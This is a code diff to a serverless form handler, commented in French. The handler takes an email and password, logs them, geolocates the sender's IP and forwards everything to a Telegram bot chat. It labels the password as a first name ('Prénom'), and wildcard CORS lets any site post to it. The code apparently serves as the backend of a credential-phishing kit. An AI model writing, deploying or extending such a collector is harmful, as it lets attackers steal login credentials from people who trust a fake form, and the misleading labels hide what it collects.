@@ -1,20 +1,32 @@
 export async function handler(event) {
+  // Vérifier que la méthode HTTP est bien POST
   if (event.httpMethod !== "POST") {
     return {
       statusCode: 405,
       body: "Method Not Allowed",
+      headers: {
+        "Access-Control-Allow-Origin": "*",  // Permet l'accès depuis n'importe quelle origine
+        "Access-Control-Allow-Methods": "POST", // Permet uniquement les requêtes POST
+        "Access-Control-Allow-Headers": "Content-Type", // Permet l'en-tête Content-Type
+      },
     };
   }
 
   try {
     // Extraction des données du corps de la requête
-    const { email, motDePasse } = JSON.parse(event.body);
-    console.log("Données reçues:", { email, motDePasse });
+    const { email, password } = JSON.parse(event.body);
+    console.log("Données reçues:", { email, password });
 
-    if (!email || !motDePasse) {
+    // Vérifier si les champs sont présents
+    if (!email || !password) {
       return {
         statusCode: 400,
         body: JSON.stringify({ error: "Champs manquants" }),
+        headers: {
+          "Access-Control-Allow-Origin": "*",
+          "Access-Control-Allow-Methods": "POST",
+          "Access-Control-Allow-Headers": "Content-Type",
+        },
       };
     }
 
@@ -30,16 +42,19 @@ export async function handler(event) {
     const { city, country } = locationData;
     const ipLocation = `${ip} (${city}, ${country})`;
 
+    // Récupérer le token Telegram et l'ID de chat à partir des variables d'environnement
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+    // Préparer le message à envoyer
     const message = `
 📩 Nouveau formulaire
 🌍 IP : ${ipLocation}
 👤 Nom : ${email}
-👤 Prénom : ${motDePasse}
+👤 Prénom : ${password}
     `;
 
+    // Envoi du message à l'API Telegram
     const response = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
       {
@@ -52,24 +67,38 @@ export async function handler(event) {
       }
     );
 
+    // Analyse de la réponse de Telegram
     const data = await response.json();
     console.log("Réponse de Telegram:", data);
 
+    // Si l'envoi a échoué, lever une erreur
     if (!response.ok) {
       throw new Error("Erreur Telegram");
     }
 
+    // Retourner une réponse 200 en cas de succès
     return {
       statusCode: 200,
       body: JSON.stringify({ success: true }),
+      headers: {
+        "Access-Control-Allow-Origin": "*", // Permet à toutes les origines d'accéder
+        "Access-Control-Allow-Methods": "POST", // Méthode autorisée
+        "Access-Control-Allow-Headers": "Content-Type", // En-tête autorisé
+      },
     };
 
   } catch (err) {
+    // Gestion des erreurs (celles qui surviennent lors de l'envoi)
     console.error("Erreur dans la fonction:", err);
+
     return {
       statusCode: 500,
       body: JSON.stringify({ error: err.message }),
+      headers: {
+        "Access-Control-Allow-Origin": "*", // Permet l'accès à partir de n'importe quelle origine
+        "Access-Control-Allow-Methods": "POST", // Méthode autorisée
+        "Access-Control-Allow-Headers": "Content-Type", // En-tête autorisé
+      },
     };
   }
 }
-
